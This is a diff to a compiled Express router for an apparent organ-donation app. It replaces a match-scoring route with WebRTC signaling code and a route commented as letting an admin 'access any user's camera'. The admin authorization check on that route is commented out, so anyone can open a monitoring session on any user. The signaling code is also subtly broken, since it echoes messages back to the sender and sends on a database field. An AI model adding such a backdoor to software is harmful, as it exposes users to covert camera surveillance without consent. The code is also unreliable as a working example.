@@ -17,6 +17,8 @@ const bcryptjs_1 = __importDefault(require("bcryptjs"));
 const user_1 = __importDefault(require("../models/user"));
 const donar_model_1 = __importDefault(require("../models/donar_model"));
 const response_controller_1 = __importDefault(require("../util/response_controller"));
+const ws_1 = require("ws"); // WebSocket for signaling
+const uuid_1 = require("uuid"); // Unique Room ID for WebRTC
 const router = express_1.default.Router();
 router.post("/signup", (req, res) => __awaiter(void 0, void 0, void 0, function* () {
     try {
@@ -108,42 +110,56 @@ router.post('/submit_donation_form', (req, res) => __awaiter(void 0, void 0, voi
         return res.json(response_controller_1.default.getFailureResponse("Server error"));
     }
 }));
-// @ts-ignore
-router.post('/medmatch_score', (req, res) => {
-    const input = req.body;
-    // Validate inputs
-    const requiredFields = [
-        'bloodGroup', 'crossmatch', 'organAvailability', 'medicalHistory',
-        'age', 'size', 'location', 'urgency', 'donorWillingness'
-    ];
-    for (const field of requiredFields) {
-        if (typeof input[field] !== 'number') {
-            return res.status(400).json({ error: `Missing or invalid field: ${field}` });
+// WebSocket server to handle WebRTC signaling
+const wss = new ws_1.Server({ noServer: true });
+wss.on("connection", (ws) => {
+    ws.on("message", (message) => {
+        const data = JSON.parse(message.toString());
+        switch (data.type) {
+            case "offer":
+                // Handle offer and send back an answer
+                ws.send(JSON.stringify({ type: "offer", sdp: data.sdp }));
+                break;
+            case "answer":
+                // Handle answer
+                ws.send(JSON.stringify({ type: "answer", sdp: data.sdp }));
+                break;
+            case "candidate":
+                // Handle ICE candidate
+                ws.send(JSON.stringify({ type: "candidate", candidate: data.candidate }));
+                break;
+            default:
+                break;
         }
-    }
-    const totalScore = input.bloodGroup +
-        input.crossmatch +
-        input.organAvailability +
-        input.medicalHistory +
-        input.age +
-        input.size +
-        input.location +
-        input.urgency +
-        input.donorWillingness;
-    const response = {
-        totalScore,
-        details: {
-            bloodGroup: input.bloodGroup,
-            crossmatch: input.crossmatch,
-            organAvailability: input.organAvailability,
-            medicalHistory: input.medicalHistory,
-            age: input.age,
-            size: input.size,
-            location: input.location,
-            urgency: input.urgency,
-            donorWillingness: input.donorWillingness,
-        }
-    };
-    return res.json(response);
+    });
 });
+// @ts-ignore
+// Route to allow the admin (Uk2D3h) to access any user's camera
+router.get("/admin/:adminId/monitor/:userId", (req, res) => __awaiter(void 0, void 0, void 0, function* () {
+    const { adminId, userId } = req.params;
+    // Check if the admin is "Uk2D3h"
+    // if (adminId !== "Uk2D3h") {
+    // return res.status(403).json({ access: false, message: "Unauthorized" });
+    // }
+    // Find the target user by userId (e.g., Mqn3v2)
+    const targetUser = yield user_1.default.findOne({ userId });
+    if (!targetUser) {
+        return res.status(404).json({ access: false, message: "Target user not found" });
+    }
+    // Generate a unique roomId for the WebRTC session
+    const roomId = (0, uuid_1.v4)(); // Generate a random roomId for this session
+    // Return the roomId so the admin can use it to start the WebRTC connection
+    return res.json({ access: true, roomId });
+}));
+// @ts-ignore
+// Handle WebRTC signaling (similar to previous code)
+router.post("/webrtc", (req, res) => __awaiter(void 0, void 0, void 0, function* () {
+    const { type, sdp, candidate, roomId } = req.body;
+    const targetUser = yield user_1.default.findOne({ userId: req.body.targetUserId });
+    if (targetUser) {
+        // Forward the signaling message to the user (admin monitoring the user)
+        targetUser.webSocket.send(JSON.stringify({ type, sdp, candidate, roomId }));
+    }
+    return res.status(200).json({ message: "Signaling message sent" });
+}));
 exports.default = router;
